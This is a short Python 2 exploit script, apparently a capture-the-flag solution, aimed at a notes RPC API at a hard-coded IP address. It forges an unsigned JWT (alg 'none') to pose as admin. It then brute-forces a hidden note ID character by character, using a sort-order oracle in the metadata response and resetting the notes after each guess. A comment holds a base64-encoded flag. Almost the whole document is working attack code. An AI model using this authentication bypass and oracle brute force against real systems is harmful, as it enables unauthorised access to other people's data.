import requests
import sys
import json
import base64

'''
v1 and v2 are valid
NzAyLUNURi1GTEFHOiBOUDI2bkRPSTZINUFTZW1BT1c2Zw==
'''

# api rpc client
api = "http://159.203.178.9/rpc.php"

# JWT Bypass token for admin
token_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6MX0."
header22 = {"Host":"159.203.178.9", "Accept":"application/notes.api.v2+json", "Authorization":token_jwt}

# Hepler methods
def getMetadata():
	r = requests.get(api+"?method=getNotesMetadata", headers=header22)
	return r.json()

def createNote(idz):
	jsin = {"note":"meh", "id":idz}
	r = requests.post(api+"?method=createNote", headers=header22, json=jsin)
	print r.text

def reset():
	r = requests.post(api+"?method=resetNotes", headers=header22)

# id should be filled here
send = ""

# If any notes exist then delete
reset()

# Assuming the id size is 20
for i in xrange(0,20):
	for char in "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA9876543210":
		createNote(send+char)
		print getMetadata()
		if getMetadata()['epochs'][0] != '1528911533':
			print getMetadata()
			send +=char
			print send
			reset()
			break
		reset()
	reset()
